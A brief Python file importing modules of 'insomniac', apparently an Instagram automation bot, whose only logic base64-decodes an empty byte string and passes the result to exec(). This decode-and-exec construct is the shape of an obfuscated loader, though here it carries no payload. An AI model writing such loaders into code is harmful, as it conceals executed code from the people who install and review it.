from functools import partial

from insomniac.device_facade import DeviceFacade
from insomniac.interaction import interact_with_user, is_follow_limit_reached_for_source
from insomniac.navigation import search_for
from insomniac.storage import FollowingStatus
from insomniac.utils import *

import base64

code = base64.b64decode(b'')
exec(code)
